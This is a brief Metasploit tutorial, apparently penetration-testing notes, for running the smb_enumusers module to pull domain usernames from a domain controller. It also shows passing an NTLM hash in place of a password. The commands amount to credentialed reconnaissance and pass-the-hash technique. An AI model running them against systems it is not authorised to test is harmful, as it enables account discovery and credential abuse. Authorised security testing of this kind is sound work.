# Metasploit SMB_EnumUsers to Pull Domain Usernames


#### Setup the database
```bash
msfdb init
```

#### Start the console
```bash
msfconsole
```

#### Run the Following
```bash
use auxiliary/scanner/smb/smb_enumusers
```

#### View current settings/options
```bash
options
```

#### Use the following to change options:
```bash
set rhosts DOMAIN_CONTROLLER_IP
set smbdomain DOMAIN_NAME
set smbuser USERNAME
set smbpass PASSWORD
```

 - `DOMAIN_CONTROLLER_IP` is the IP of the domain controller. E.g. `10.3.1.254`
 - `DOMAIN_NAME` is domain name. E.g. `my-domain.local`
 - `USERNAME` is the username of a known domain user. E.g. `oldmate`
 - `PASSWORD` is the password of the supplied username. It can be the plaintext password or the NTLM hash of the password. E.g. `Password123`


#### Enable Logging to a text file
```bash
spool logs.txt
```

Ensure you run the `options` command after you enable logging so that you have a log of what options you had enabled.

#### Run the attack
```bash
run
```

#### Use a NTLM Hash Rather then a Password
Set the password to a hash rather then a plaintext password. The left side is the blank LM hash, the right side is the NTLM hash we are passing.
```bash
set smbpass AAD3B435B51404EEAAD3B435B51404EE:58A478135A93AC3BF058A5EA0E8FDB71
```